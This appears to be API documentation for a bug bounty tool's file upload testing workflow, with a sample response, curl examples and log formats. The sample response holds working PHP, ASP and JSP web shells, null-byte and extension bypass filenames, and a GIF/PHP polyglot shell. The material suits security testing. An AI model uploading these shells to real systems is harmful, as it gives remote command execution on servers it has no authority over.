# File Upload Testing Workflow API

## Overview

This workflow creates a comprehensive file upload vulnerability testing framework for bug bounty hunting. It generates test files, bypass techniques, and structured testing phases to identify file upload vulnerabilities in web applications.

## REST API Endpoint

**Path:** `/api/bugbounty/file-upload-testing`
**Method:** `POST`
**Content-Type:** `application/json`

## Parameters

### Required Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `target_url` | `string` | The target URL or domain to test for file upload vulnerabilities |

### Request Body Example

```json
{
  "target_url": "https://example.com/upload"
}
```

## Response Format

The endpoint returns a JSON response with the following structure:

```json
{
  "success": true,
  "workflow": {
    "target": "https://example.com/upload",
    "test_phases": [
      {
        "name": "reconnaissance",
        "description": "Identify upload endpoints",
        "tools": ["katana", "gau", "paramspider"],
        "expected_findings": ["upload_forms", "api_endpoints"]
      },
      {
        "name": "baseline_testing",
        "description": "Test legitimate file uploads",
        "test_files": ["image.jpg", "document.pdf", "text.txt"],
        "observations": ["response_codes", "file_locations", "naming_conventions"]
      },
      {
        "name": "malicious_upload_testing",
        "description": "Test malicious file uploads",
        "test_files": {
          "web_shells": [...],
          "bypass_files": [...],
          "polyglot_files": [...]
        },
        "bypass_techniques": [...]
      },
      {
        "name": "post_upload_verification",
        "description": "Verify uploaded files and test execution",
        "actions": ["file_access_test", "execution_test", "path_traversal_test"]
      }
    ],
    "test_files": {
      "web_shells": [
        {
          "name": "simple_php_shell.php",
          "content": "<?php system($_GET['cmd']); ?>"
        },
        {
          "name": "asp_shell.asp",
          "content": "<%eval request(\"cmd\")%>"
        },
        {
          "name": "jsp_shell.jsp",
          "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
        }
      ],
      "bypass_files": [
        {
          "name": "shell.php.txt",
          "technique": "double_extension"
        },
        {
          "name": "shell.php%00.txt",
          "technique": "null_byte"
        },
        {
          "name": "shell.PhP",
          "technique": "case_variation"
        },
        {
          "name": "shell.php.",
          "technique": "trailing_dot"
        }
      ],
      "polyglot_files": [
        {
          "name": "polyglot.jpg",
          "content": "GIF89a<?php system($_GET['cmd']); ?>",
          "technique": "image_polyglot"
        }
      ]
    },
    "estimated_time": 360,
    "risk_level": "high"
  }
}
```

## cURL Command Example

```bash
curl -X POST \
  http://127.0.0.1:8888/api/bugbounty/file-upload-testing \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://example.com/upload"
  }'
```

## Testing with Different Targets

```bash
# Test upload form
curl -X POST \
  http://127.0.0.1:8888/api/bugbounty/file-upload-testing \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://vulnerable-site.com/upload"
  }'

# Test API endpoint
curl -X POST \
  http://127.0.0.1:8888/api/bugbounty/file-upload-testing \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://api.example.com/v1/files/upload"
  }'
```

## Logging

Logs for this workflow are stored in:
```
logs/workflows.file_upload_testing.file_upload_testing.log
```

### Log Format
```
YYYY-MM-DD HH:MM:SS,mmm - workflows.file_upload_testing.file_upload_testing - LEVEL - MESSAGE
```

### Sample Log Entries
```
2025-01-15 10:30:45,123 - workflows.file_upload_testing.file_upload_testing - INFO - Creating file upload testing workflow for https://example.com/upload
2025-01-15 10:30:45,124 - workflows.file_upload_testing.file_upload_testing - INFO - File upload testing workflow created for https://example.com/upload
```

## Generated Test Content

The workflow automatically generates various types of test files:

### Web Shells
- PHP shells with command execution
- ASP shells for Windows IIS servers
- JSP shells for Java applications

### Bypass Techniques
- Double extension bypass (e.g., `shell.php.txt`)
- Null byte injection (e.g., `shell.php%00.txt`)
- Case variation bypass (e.g., `shell.PhP`)
- Trailing dot bypass (e.g., `shell.php.`)

### Polyglot Files
- Image polyglots that combine valid image headers with executable code
- Files that appear as legitimate images but contain malicious payloads

## Error Responses

### Missing Required Field
```json
{
  "error": "Target_url is required"
}
```

### Invalid JSON
```json
{
  "error": "JSON data is required"
}
```

### Server Error
```json
{
  "error": "Server error: [detailed error message]"
}
```

## Security Considerations

**Warning:** This workflow generates potentially dangerous file upload test cases including web shells and bypass techniques. It should only be used:

1. On systems you own or have explicit permission to test
2. In isolated testing environments
3. For legitimate security assessments and bug bounty programs

**Never use this workflow against systems without proper authorization.**

## Integration Notes

- The workflow integrates with the bug bounty MCP server's logging system
- All requests are validated for required fields before processing
- Responses follow the standardized format with success indicators
- Exception handling provides meaningful error messages for debugging
